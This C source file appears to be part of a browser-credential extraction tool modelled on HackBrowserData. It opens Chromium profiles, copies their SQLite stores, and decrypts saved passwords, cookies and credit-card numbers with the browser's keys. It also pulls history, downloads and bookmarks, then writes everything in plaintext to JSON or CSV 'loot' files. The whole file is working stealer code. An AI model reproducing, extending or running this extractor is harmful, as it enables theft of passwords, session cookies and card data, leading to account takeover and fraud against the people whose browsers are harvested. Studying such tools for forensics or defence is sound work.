/* bd_chromium.c - Chromium-family extraction: passwords, cookies, history,
 * downloads, credit cards (SQLite), bookmarks (JSON). Mirrors
 * browser/chromium/extract_*.go + source.go of HackBrowserData. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  free(void *);
extern void  *malloc(size_t);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);

static const char *SQL_PASSWORDS =
    "SELECT origin_url, username_value, password_value, date_created FROM logins";
static const char *SQL_COOKIES =
    "SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc,"
    " is_secure, is_httponly, has_expires, is_persistent, samesite FROM cookies";
static const char *SQL_HISTORY =
    "SELECT url, COALESCE(title,''), visit_count, COALESCE(last_visit_time,0) FROM urls";
static const char *SQL_DOWNLOADS =
    "SELECT COALESCE(tab_url,''), target_path, COALESCE(mime_type,''),"
    " COALESCE(total_bytes,0), COALESCE(start_time,0), COALESCE(end_time,0) FROM downloads";
static const char *SQL_CARDS =
    "SELECT COALESCE(guid,''), COALESCE(name_on_card,''), COALESCE(expiration_month,0),"
    " COALESCE(expiration_year,0), card_number_encrypted FROM credit_cards";

/* ------------------------------------------------------------ emission -- */
typedef struct {
    bd_out *out;
    bd_sb   sb;
    bd_sb   staging;     /* staging dir for this profile */
    int     fmt;
    int     rows;
    int     cat;
    const bd_browser_t *br;
    const char *profileName;
    char    filePath[700];
} emitctx;

static void emit_begin(emitctx *e, const char *catName) {
    if (e->fmt == BD_FMT_JSON) {
        bd_sb_put(&e->sb, "{\"browser\":");
        bd_sb_json_str(&e->sb, e->br->name);
        bd_sb_put(&e->sb, ",\"profile\":");
        bd_sb_json_str(&e->sb, e->profileName);
        bd_sb_put(&e->sb, ",\"category\":");
        bd_sb_json_str(&e->sb, catName);
        bd_sb_put(&e->sb, ",\"rows\":[");
    }
}
static void emit_end(emitctx *e, const char *catName) {
    char ts[32];
    (void)ts;
    if (e->fmt == BD_FMT_JSON) {
        bd_sb_put(&e->sb, "]}");
    } else {
        /* CSV file done (headers already written) */
    }
    if (e->out->outDir && *e->out->outDir) {
        _snprintf(e->filePath, sizeof(e->filePath), "%s\\%s_%s_%s.%s",
                  e->out->outDir, e->br->key, e->profileName, catName,
                  e->fmt == BD_FMT_JSON ? "json" : "csv");
        bd_write_file(e->filePath, e->sb.buf, e->sb.len);
    } else {
        e->filePath[0] = 0;   /* stdout mode: no loot files */
    }
    if (e->out->verbose && e->out->chunk && e->sb.len)
        e->out->chunk(e->out->ctx, e->sb.buf, (int)e->sb.len);
}

static void row_open(emitctx *e, int first) {
    if (e->fmt == BD_FMT_JSON) {
        if (!first) bd_sb_put(&e->sb, ",");
        bd_sb_put(&e->sb, "{");
    }
}
static void row_close(emitctx *e) {
    if (e->fmt == BD_FMT_JSON) bd_sb_put(&e->sb, "}");
    else bd_sb_put(&e->sb, "\r\n");
}
static void jkv(emitctx *e, const char *k, const char *v, int first) {
    if (e->fmt == BD_FMT_JSON) {
        char kb[48];
        _snprintf(kb, sizeof(kb), "%s\"%s\":", first ? "" : ",", k);
        bd_sb_put(&e->sb, kb);
        bd_sb_json_str(&e->sb, v);
    } else {
        if (!first) bd_sb_put(&e->sb, ",");
        bd_sb_csv_field(&e->sb, v);
    }
}
static void jkv_num(emitctx *e, const char *k, long long v, int first) {
    if (e->fmt == BD_FMT_JSON) {
        char b[80];
        _snprintf(b, sizeof(b), "%s\"%s\":%lld", first ? "" : ",", k, v);
        bd_sb_put(&e->sb, b);
    } else {
        char b[32];
        if (!first) bd_sb_put(&e->sb, ",");
        _snprintf(b, sizeof(b), "%lld", v);
        bd_sb_put(&e->sb, b);
    }
}
static void jkv_bool(emitctx *e, const char *k, int v, int first) {
    if (e->fmt == BD_FMT_JSON) {
        char b[64];
        _snprintf(b, sizeof(b), "%s\"%s\":%s", first ? "" : ",", k, v ? "true" : "false");
        bd_sb_put(&e->sb, b);
    } else {
        if (!first) bd_sb_put(&e->sb, ",");
        bd_sb_put(&e->sb, v ? "true" : "false");
    }
}

static char *plain_to_str(unsigned char *p, size_t n) {
    /* re-allocate as NUL-terminated string; strip trailing NULs from DPAPI */
    char *s;
    while (n && p[n - 1] == 0) n--;
    s = (char *)malloc(n + 1);
    if (!s) { free(p); return NULL; }
    memcpy(s, p, n); s[n] = 0;
    free(p);
    return s;
}

/* one human-readable line per row (stdout mode); output via chunk() */
static void e_human2(emitctx *e, const char *a, const char *b, const char *c) {
    char line[600];
    if (!e->out->human || !e->out->chunk) return;
    _snprintf(line, sizeof(line), "    %s | %s | %s",
              a ? a : "", b ? b : "", c ? c : "");
    e->out->chunk(e->out->ctx, line, (int)strlen(line));
    e->out->chunk(e->out->ctx, "\n", 1);
}

/* ------------------------------------------------------------ categories -- */
static int ext_passwords(emitctx *e, const char *dbPath, bd_keys_t *keys,
                         const char *storeName) {
    bd_db *db = bd_db_open_copy(dbPath, e->staging.buf, NULL, 0);
    int first = 1, n = 0;
    if (!db) return -1;
    if (bd_db_query(db, SQL_PASSWORDS) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        const unsigned char *url, *user, *blob;
        int urllen, userlen, bloblen;
        unsigned char *pt = NULL; size_t ptlen = 0;
        char tbuf[32], *pwd;
        if (rc < 0) break;
        if (rc == 0) break;
        url  = bd_col_text(db, 0, &urllen);
        user = bd_col_text(db, 1, &userlen);
        blob = bd_col_blob(db, 2, &bloblen);
        pt = bd_chromium_decrypt(keys, blob, (size_t)bloblen, &ptlen);
        pwd = pt ? plain_to_str(pt, ptlen) : NULL;
        bd_fmt_time(tbuf, sizeof(tbuf), bd_col_i64(db, 3), 1);
        row_open(e, first);
        {
            int f = 1;
            char *u2, *u3;
            /* JSON needs NUL-terminated copies for url/user */
            u2 = (char *)malloc((size_t)urllen + 1);
            if (u2) { memcpy(u2, url, urllen); u2[urllen] = 0; }
            jkv(e, "url", u2 ? u2 : "", f), f = 0;
            u3 = (char *)malloc((size_t)userlen + 1);
            if (u3) { memcpy(u3, user, userlen); u3[userlen] = 0; }
            jkv(e, "username", u3 ? u3 : "", f);
            jkv(e, "password", pwd ? pwd : "", 0);
            jkv(e, "created_at", tbuf, 0);
            jkv(e, "store", storeName, 0);
            if (e->out->human && e->out->chunk)
                e_human2(e, u2, u3, pwd ? pwd : "");
            if (u2) free(u2);
            if (u3) free(u3);
        }
        row_close(e);
        if (pwd) free(pwd);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

static int ext_cookies(emitctx *e, const char *dbPath, bd_keys_t *keys) {
    bd_db *db = bd_db_open_copy(dbPath, e->staging.buf, NULL, 0);
    int first = 1, n = 0;
    if (!db) return -1;
    if (bd_db_query(db, SQL_COOKIES) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        const unsigned char *name, *blob, *host, *cpath;
        int namelen, bloblen, hostlen, pathlen;
        unsigned char *pt = NULL; size_t ptlen = 0;
        char *val = NULL, t1[32], t2[32], *h2 = NULL, *n2 = NULL;
        long long created, expires;
        if (rc <= 0) break;
        name  = bd_col_text(db, 0, &namelen);
        blob  = bd_col_blob(db, 1, &bloblen);
        host  = bd_col_text(db, 2, &hostlen);
        cpath = bd_col_text(db, 3, &pathlen);
        created = bd_col_i64(db, 4);
        expires = bd_col_i64(db, 5);
        pt = bd_chromium_decrypt(keys, blob, (size_t)bloblen, &ptlen);
        if (pt) {
            ptlen = bd_strip_cookie_hash(pt, ptlen, (const char *)host);
            val = plain_to_str(pt, ptlen);
        }
        h2 = (char *)malloc((size_t)hostlen + 1);
        if (h2) { memcpy(h2, host, hostlen); h2[hostlen] = 0; }
        bd_fmt_time(t1, sizeof(t1), created, 1);
        bd_fmt_time(t2, sizeof(t2), expires, 1);
        row_open(e, first);
        {
            int f = 1;
            char *p2;
            n2 = (char *)malloc((size_t)namelen + 1);
            if (n2) { memcpy(n2, name, namelen); n2[namelen] = 0; }
            jkv(e, "name", n2 ? n2 : "", f), f = 0;
            jkv(e, "value", val ? val : "", f);
            jkv(e, "host", h2 ? h2 : "", f);
            p2 = (char *)malloc((size_t)pathlen + 1);
            if (p2) { memcpy(p2, cpath, pathlen); p2[pathlen] = 0; }
            jkv(e, "path", p2 ? p2 : "", f);
            if (p2) free(p2);
            jkv_bool(e, "is_secure", bd_col_i64(db, 6) != 0, f);
            jkv_bool(e, "is_http_only", bd_col_i64(db, 7) != 0, f);
            jkv_bool(e, "has_expire", bd_col_i64(db, 8) != 0, f);
            jkv_bool(e, "is_persistent", bd_col_i64(db, 9) != 0, f);
            jkv(e, "expire_at", t2, f);
            jkv(e, "created_at", t1, f);
            {
                long long ss = bd_col_i64(db, 10);
                const char *sss = ss == 0 ? "none" : ss == 1 ? "lax" :
                                  ss == 2 ? "strict" : "unspecified";
                jkv(e, "same_site", sss, f);
            }
        }
        row_close(e);
        if (e->out->human && e->out->chunk) e_human2(e, h2, n2, val);
        if (h2) free(h2);
        if (n2) free(n2);
        if (val) free(val);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

static int ext_history(emitctx *e, const char *dbPath) {
    bd_db *db = bd_db_open_copy(dbPath, e->staging.buf, NULL, 0);
    int first = 1, n = 0;
    if (!db) return -1;
    if (bd_db_query(db, SQL_HISTORY) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        const unsigned char *url, *title;
        int urllen, titlelen;
        char t[32], *u2, *t2;
        if (rc <= 0) break;
        url = bd_col_text(db, 0, &urllen);
        title = bd_col_text(db, 1, &titlelen);
        bd_fmt_time(t, sizeof(t), bd_col_i64(db, 3), 1);
        u2 = (char *)malloc((size_t)urllen + 1);
        if (u2) { memcpy(u2, url, urllen); u2[urllen] = 0; }
        t2 = (char *)malloc((size_t)titlelen + 1);
        if (t2) { memcpy(t2, title, titlelen); t2[titlelen] = 0; }
        row_open(e, first);
        {
            int f = 1;
            jkv(e, "url", u2 ? u2 : "", f), f = 0;
            jkv(e, "title", t2 ? t2 : "", f);
            jkv_num(e, "visit_count", bd_col_i64(db, 2), f);
            jkv(e, "last_visit", t, f);
        }
        row_close(e);
        if (e->out->human && e->out->chunk) e_human2(e, u2, t2, t);
        if (u2) free(u2);
        if (t2) free(t2);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

static int ext_downloads(emitctx *e, const char *dbPath) {
    bd_db *db = bd_db_open_copy(dbPath, e->staging.buf, NULL, 0);
    int first = 1, n = 0;
    if (!db) return -1;
    if (bd_db_query(db, SQL_DOWNLOADS) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        const unsigned char *taburl, *target, *mime;
        int urllen, targetlen, mimelen;
        char t1[32], t2[32], *a, *b, *c;
        if (rc <= 0) break;
        taburl = bd_col_text(db, 0, &urllen);
        target = bd_col_text(db, 1, &targetlen);
        mime   = bd_col_text(db, 2, &mimelen);
        bd_fmt_time(t1, sizeof(t1), bd_col_i64(db, 4), 1);
        bd_fmt_time(t2, sizeof(t2), bd_col_i64(db, 5), 1);
        a = (char *)malloc((size_t)urllen + 1);
        if (a) { memcpy(a, taburl, urllen); a[urllen] = 0; }
        b = (char *)malloc((size_t)targetlen + 1);
        if (b) { memcpy(b, target, targetlen); b[targetlen] = 0; }
        c = (char *)malloc((size_t)mimelen + 1);
        if (c) { memcpy(c, mime, mimelen); c[mimelen] = 0; }
        row_open(e, first);
        {
            int f = 1;
            jkv(e, "url", a ? a : "", f), f = 0;
            jkv(e, "target_path", b ? b : "", f);
            jkv(e, "mime_type", c ? c : "", f);
            jkv_num(e, "total_bytes", bd_col_i64(db, 3), f);
            jkv(e, "start_time", t1, f);
            jkv(e, "end_time", t2, f);
        }
        row_close(e);
        if (a) free(a);
        if (b) free(b);
        if (c) free(c);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

static int ext_creditcards(emitctx *e, const char *dbPath, bd_keys_t *keys) {
    bd_db *db = bd_db_open_copy(dbPath, e->staging.buf, NULL, 0);
    int first = 1, n = 0;
    if (!db) return -1;
    if (bd_db_query(db, SQL_CARDS) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        const unsigned char *guid, *name, *blob;
        int guidlen, namelen, bloblen;
        unsigned char *pt = NULL; size_t ptlen = 0;
        char *num = NULL, *g2, *n2;
        if (rc <= 0) break;
        guid = bd_col_text(db, 0, &guidlen);
        name = bd_col_text(db, 1, &namelen);
        blob = bd_col_blob(db, 4, &bloblen);
        pt = bd_chromium_decrypt(keys, blob, (size_t)bloblen, &ptlen);
        num = pt ? plain_to_str(pt, ptlen) : NULL;
        g2 = (char *)malloc((size_t)guidlen + 1);
        if (g2) { memcpy(g2, guid, guidlen); g2[guidlen] = 0; }
        n2 = (char *)malloc((size_t)namelen + 1);
        if (n2) { memcpy(n2, name, namelen); n2[namelen] = 0; }
        row_open(e, first);
        {
            int f = 1;
            jkv(e, "guid", g2 ? g2 : "", f), f = 0;
            jkv(e, "name", n2 ? n2 : "", f);
            jkv(e, "number", num ? num : "", f);
            jkv_num(e, "exp_month", bd_col_i64(db, 2), f);
            jkv_num(e, "exp_year", bd_col_i64(db, 3), f);
        }
        row_close(e);
        if (e->out->human && e->out->chunk) e_human2(e, n2, num, "");
        if (g2) free(g2);
        if (n2) free(n2);
        if (num) free(num);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

/* ------------------------------------------------------------- bookmarks -- */
static void walk_bookmark_node(emitctx *e, const bd_json *node,
                               const char *folder, int *first) {
    const bd_json *children, *t, *u, *idn, *typ, *dan;
    const char *name_, *url_, *type_;
    char idbuf[32], tbuf[32];
    const char *childFolder;
    char *childFolderM;

    if (!bd_json_is_obj(node)) return;
    typ = bd_json_get(node, "type");
    type_ = typ ? bd_json_str(typ) : NULL;
    t = bd_json_get(node, "name");
    name_ = t ? bd_json_str(t) : "";
    u = bd_json_get(node, "url");
    url_ = u ? bd_json_str(u) : NULL;

    if (url_ && type_ && bd_str_ieq(type_, "url")) {
        idn = bd_json_get(node, "id");
        dan = bd_json_get(node, "date_added");
        _snprintf(idbuf, sizeof(idbuf), "%lld",
                  idn ? (long long)bd_json_num(idn) : 0);
        bd_fmt_time(tbuf, sizeof(tbuf),
                    dan ? (long long)bd_json_num(dan) : 0, 1);
        row_open(e, *first);
        {
            int f = 1;
            jkv(e, "id", idbuf, f), f = 0;
            jkv(e, "name", name_ ? name_ : "", f);
            jkv(e, "type", "url", f);
            jkv(e, "url", url_, f);
            jkv(e, "folder", folder ? folder : "", f);
            jkv(e, "created_at", tbuf, f);
        }
        row_close(e);
        *first = 0;
        e->rows++;
    }
    children = bd_json_get(node, "children");
    if (bd_json_is_arr(children)) {
        int i, cnt = bd_json_arr_count(children);
        for (i = 0; i < cnt; i++) {
            const bd_json *ch = bd_json_arr_at(children, i);
            /* folder path for children: current node's name if it is a folder */
            childFolder = folder;
            if (type_ && bd_str_ieq(type_, "folder") && name_) {
                size_t fl = strlen(folder ? folder : "");
                size_t nl = strlen(name_);
                childFolderM = (char *)malloc(fl + nl + 2);
                if (childFolderM) {
                    memcpy(childFolderM, folder ? folder : "", fl);
                    childFolderM[fl] = '/';
                    memcpy(childFolderM + fl + 1, name_, nl);
                    childFolderM[fl + nl + 1] = 0;
                    childFolder = childFolderM;
                }
            }
            walk_bookmark_node(e, ch, childFolder, first);
            if (childFolderM) { free(childFolderM); childFolderM = NULL; }
        }
    }
}

static int ext_bookmarks(emitctx *e, const char *bmPath) {
    char *data = NULL; size_t len = 0;
    bd_json *j;
    const bd_json *roots;
    static const char *rootKeys[] = { "bookmark_bar", "other", "synced" };
    int i, first = 1, n0 = e->rows;

    if (bd_read_file(bmPath, &data, &len) != 0) return -1;
    j = bd_json_parse(data, len);
    free(data);
    if (!j) return -1;
    roots = bd_json_get(j, "roots");
    if (bd_json_is_obj(roots)) {
        for (i = 0; i < 3; i++) {
            const bd_json *r = bd_json_get(roots, rootKeys[i]);
            if (r) walk_bookmark_node(e, r, rootKeys[i], &first);
        }
    }
    bd_json_free(j);
    return e->rows - n0;
}

/* ---------------------------------------------------------------- driver -- */
static int cat_file_exists(const char *dir, const char *rel, char *out, size_t cap) {
    if (!bd_path_join(out, cap, dir, rel)) return 0;
    {
        DWORD a = GetFileAttributesA(out);
        return (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY));
    }
}

static int run_category(emitctx *e, int cat, const char *profileDir) {
    char p1[700], p2[700];
    int n = -1;
    bd_keys_t keys;
    int need_keys = (cat & (BD_CAT_PASSWORDS | BD_CAT_COOKIES | BD_CAT_CREDITCARDS)) != 0;

    switch (cat) {
    case BD_CAT_PASSWORDS:
        if (cat_file_exists(profileDir, "Login Data", p1, sizeof(p1))) {
            if (need_keys) bd_load_chromium_keys(e->br->key, profileDir, &keys);
            emit_begin(e, "passwords");
            /* CSV header */
            if (e->fmt == BD_FMT_CSV)
                bd_sb_put(&e->sb, "url,username,password,created_at,store\r\n");
            n = ext_passwords(e, p1, &keys, "Login Data");
            if (cat_file_exists(profileDir, "Login Data For Account", p2, sizeof(p2)))
                n += ext_passwords(e, p2, &keys, "Login Data For Account");
            emit_end(e, "passwords");
        }
        break;
    case BD_CAT_COOKIES:
        if (cat_file_exists(profileDir, "Network\\Cookies", p1, sizeof(p1)) ||
            cat_file_exists(profileDir, "Cookies", p1, sizeof(p1))) {
            if (need_keys) bd_load_chromium_keys(e->br->key, profileDir, &keys);
            emit_begin(e, "cookies");
            if (e->fmt == BD_FMT_CSV)
                bd_sb_put(&e->sb, "name,value,host,path,is_secure,is_http_only,has_expire,is_persistent,expire_at,created_at,same_site\r\n");
            n = ext_cookies(e, p1, &keys);
            emit_end(e, "cookies");
        }
        break;
    case BD_CAT_HISTORY:
        if (cat_file_exists(profileDir, "History", p1, sizeof(p1))) {
            emit_begin(e, "history");
            if (e->fmt == BD_FMT_CSV)
                bd_sb_put(&e->sb, "url,title,visit_count,last_visit\r\n");
            n = ext_history(e, p1);
            emit_end(e, "history");
        }
        break;
    case BD_CAT_DOWNLOADS:
        if (cat_file_exists(profileDir, "History", p1, sizeof(p1))) {
            emit_begin(e, "downloads");
            if (e->fmt == BD_FMT_CSV)
                bd_sb_put(&e->sb, "url,target_path,mime_type,total_bytes,start_time,end_time\r\n");
            n = ext_downloads(e, p1);
            emit_end(e, "downloads");
        }
        break;
    case BD_CAT_CREDITCARDS:
        if (cat_file_exists(profileDir, "Web Data", p1, sizeof(p1))) {
            if (need_keys) bd_load_chromium_keys(e->br->key, profileDir, &keys);
            emit_begin(e, "creditcards");
            if (e->fmt == BD_FMT_CSV)
                bd_sb_put(&e->sb, "guid,name,number,exp_month,exp_year\r\n");
            n = ext_creditcards(e, p1, &keys);
            emit_end(e, "creditcards");
        }
        break;
    case BD_CAT_BOOKMARKS:
        if (cat_file_exists(profileDir, "Bookmarks", p1, sizeof(p1))) {
            emit_begin(e, "bookmarks");
            if (e->fmt == BD_FMT_CSV)
                bd_sb_put(&e->sb, "id,name,type,url,folder,created_at\r\n");
            n = ext_bookmarks(e, p1);
            emit_end(e, "bookmarks");
        }
        break;
    default:
        return 0;
    }
    return n;
}

static void prof_emit_cb(void *vctx, const char *profileDir);

/* profile iterator context */
typedef struct {
    const bd_browser_t *br;
    int   catMask;
    bd_out *out;
    int  *files;
} chromctx;

static int chromium_profile_cb(void *vctx, const char *profileDir) {
    chromctx *c = (chromctx *)vctx;
    emitctx e;
    int cat;
    const char *profName = bd_path_name(profileDir);
    char stagingDir[700];

    memset(&e, 0, sizeof(e));
    e.out = c->out;
    e.fmt = c->out->fmt;
    e.br = c->br;
    e.profileName = profName;
    bd_sb_init(&e.sb);
    if (c->out->outDir && *c->out->outDir)
        _snprintf(stagingDir, sizeof(stagingDir), "%s\\staging_%s_%s",
                  c->out->outDir, c->br->key, profName);
    else {
        char *t = bd_temp_dir();
        if (t) {
            _snprintf(stagingDir, sizeof(stagingDir), "%s\\stage_%s_%s",
                      t, c->br->key, profName);
            free(t);
        } else {
            stagingDir[0] = 0;
        }
    }
    bd_mkdir(stagingDir);
    bd_sb_init(&e.staging);
    bd_sb_put(&e.staging, stagingDir);

    for (cat = 1; cat <= BD_CAT_ALL; cat <<= 1) {
        int n;
        if (!(c->catMask & cat)) continue;
        n = run_category(&e, cat, profileDir);
        if (n > 0) {
            (*c->files)++;
            if (c->out->logf) {
                if (e.filePath[0])
                    c->out->logf(c->out->ctx, "[+] %s/%s %s: %d rows -> %s",
                                 c->br->name, profName, bd_cat_name(cat), n, e.filePath);
                else
                    c->out->logf(c->out->ctx, "[+] %s/%s %s: %d rows",
                                 c->br->name, profName, bd_cat_name(cat), n);
            }
        } else if (n < 0 && c->out->logf) {
            c->out->logf(c->out->ctx, "[-] %s/%s %s: not available",
                         c->br->name, profName, bd_cat_name(cat));
        }
    }
    if (stagingDir[0]) bd_rmdir(stagingDir);   /* staging DB copies already gone */
    bd_sb_free(&e.sb);
    bd_sb_free(&e.staging);
    return 1;
}

int bd_chromium_extract(const bd_browser_t *br, const char *profileDir,
                        int catMask, bd_out *out, int *files) {
    chromctx c;
    c.br = br; c.catMask = catMask; c.out = out; c.files = files;
    chromium_profile_cb(&c, profileDir);
    return 0;
}

void bd_chromium_for_profiles(const bd_browser_t *br, int catMask,
                              bd_out *out, int *files) {
    chromctx c;
    c.br = br; c.catMask = catMask; c.out = out; c.files = files;
    bd_for_each_profile(br, chromium_profile_cb, &c);
}
